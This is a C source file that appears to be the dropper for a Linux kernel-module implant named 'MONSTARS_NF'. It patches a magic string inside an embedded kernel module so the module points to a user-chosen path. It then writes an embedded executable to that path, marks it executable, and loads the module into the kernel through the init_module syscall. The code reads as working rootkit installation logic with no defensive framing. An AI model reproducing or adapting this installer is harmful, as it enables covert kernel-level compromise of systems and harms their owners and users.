#include <errno.h>
#include <linux/module.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <stdbool.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#include "macros.h"

// *** magic value in kernel module to stamp over ***
const char *c_ko_stamp_magic = "BASKETBALLJONES";

int main(int argc, char* argv[])
{
    FILE *user_exe = NULL;
    char *user_path = NULL;
    bool ko_stamped = false;

    // param validation
    if (1 == argc)
    {
        DEBUG_LOG("No user exe path specified\n");
        return -1;
    }
    user_path = argv[1];

    // find and stamp the kernel magic with the user exe path
    for (char *ko_ptr = (char *)c_KernelMod; ko_ptr < c_KernelMod + sizeof(c_KernelMod); ko_ptr++)
    {
        // search for the magic value
        if (0 == memcmp(c_ko_stamp_magic, ko_ptr, sizeof(c_ko_stamp_magic)))
        {
            printf("found it\n");
            strncpy(ko_ptr, user_path, strlen(user_path) + 1);
            ko_stamped = true;
            break;
        }
    }
    if (!ko_stamped)
    {
        DEBUG_LOG("Could not find magic value to stamp in kernel module\n");
        return -2;
    }

    // drop the user exe to disk
    user_exe = fopen(user_path, "w");
    if (NULL == user_exe)
    {
        DEBUG_LOG("Could not open %s (errno: %d)\n", user_path, errno);
        return -3;
    }
    if (sizeof(c_UserExe) != fwrite((void *)c_UserExe, sizeof(char), sizeof(c_UserExe), user_exe))
    {
        DEBUG_LOG("Could not write user exe to %s (errno: %d)\n", user_path, errno);
        return -4;
    }
    fclose(user_exe);
    user_exe = NULL;
    if (0 != chmod(user_path, S_IRWXU))
    {
        DEBUG_LOG("Could not chmod u+x on user exe (errno: %d)\n", errno);
        return -5;
    }

    // insert the kernel module
    if (0 != syscall(SYS_init_module, (void *)c_KernelMod, sizeof(c_KernelMod), ""))
    {
        DEBUG_LOG("Failed to install MONSTARS_NF module (errno: %d)\n", errno);
        return -6;
    }
    
    DEBUG_LOG("MONSTARS_NF installed!\n");

    return 0;
}